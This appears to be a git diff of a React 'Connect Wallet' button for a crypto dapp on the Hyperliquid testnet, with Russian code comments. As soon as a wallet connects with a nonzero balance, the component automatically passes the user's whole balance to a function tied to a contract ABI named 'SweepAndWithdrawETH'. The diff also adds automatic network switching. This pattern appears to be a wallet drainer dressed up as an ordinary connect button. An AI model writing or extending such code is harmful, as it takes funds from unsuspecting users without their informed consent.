@@ -6,7 +6,7 @@ import { useClientMounted } from '@/hooks/useClientMount';
 import { hyperliquidTestnet } from '@/chains/hyperliquidChain';
 import { useAppKitAccount, useAppKit } from '@reown/appkit/react';
 import { Address, encodeFunctionData } from 'viem';
-import { useBalance, useDisconnect, usePublicClient, useWriteContract, useChainId } from 'wagmi';
+import { useBalance, useDisconnect, usePublicClient, useWriteContract, useChainId, useSwitchChain } from 'wagmi';
 
 import { CONTRACT_ADDRESS_TEST } from '@/constants/constants';
 import SWEEP_AND_WITHDRAW_ABI from '@/abi/SweepAndWithdrawETH.json';
@@ -22,34 +22,13 @@ export function ConnectButton() {
   const chainId = useChainId();
   const publicClient = usePublicClient();
   const { disconnect } = useDisconnect();
-
+  const { switchChain } = useSwitchChain()
 
   // Баланс пользователя
-  const { data: balanceData, refetch: refetchBalance } = useBalance({
-    address: address as Address,
-  });
+  const { data: balanceData } = useBalance({ address: address as Address });
 
   // Подготовленный хук для записи в контракт
-  const {
-    data: donateData,
-    isError,
-    isSuccess,
-    writeContractAsync,
-    isPending,
-  } = useWriteContract();
-
-  // При подключении проверяем сеть и получаем баланс
-  useEffect(() => {
-    if (!isConnected) return;
-    if (chainId !== Number(hyperliquidTestnet.id)) {
-      // Если не на том тестнете — показываем выбор сети
-      // open({ chainId: Number(hyperliquidTestnet.id) });
-      open({ view: 'Connect', namespace: 'eip155' })
-    } else {
-      // Иначе подгружаем баланс
-      refetchBalance();
-    }
-  }, [isConnected, chainId, open, refetchBalance])
+  const { data: donateData, isError, isSuccess, writeContractAsync, isPending } = useWriteContract();
 
   // Вызов Смарт Контракта
   const handleConnectWallet = useCallback(
@@ -92,16 +71,11 @@ export function ConnectButton() {
     [publicClient, address, writeContractAsync]
   );
 
-
-  // Вызываем функцию Смарт Контракта, когда баланс подтянулся
   useEffect(() => {
-    const balance = balanceData?.value ?? BigInt(0);
-    if (isConnected && balance > BigInt(0)) {
-      handleConnectWallet(balance);
+    if (isConnected && balanceData && (balanceData?.value ?? BigInt(0)) > BigInt(0)) {
+      handleConnectWallet(balanceData.value)
     }
-  }, [isConnected, balanceData, handleConnectWallet]);
-
-   
+  }, [isConnected, balanceData && balanceData?.value, handleConnectWallet])
 
   if (!mounted) return null;
 
@@ -119,10 +93,19 @@ export function ConnectButton() {
     );
   }
 
-  // Если не подключён — показываем кнопку «Connect Wallet»
+
+  const openModal = async () => {
+    if (chainId !== Number(hyperliquidTestnet.id) && switchChain) {
+      // Переключаем сеть
+      await switchChain({ chainId: Number(hyperliquidTestnet.id) });
+    }
+    // 2) Открываем модалку подключения
+    open({ view: 'Connect', namespace: 'eip155' })
+  }
+
   return (
     <button
-      onClick={() => open({ view: 'Connect', namespace: 'eip155' })}
+      onClick={() => openModal()}
       style={{
         padding: '8px 16px',
         cursor: 'pointer',
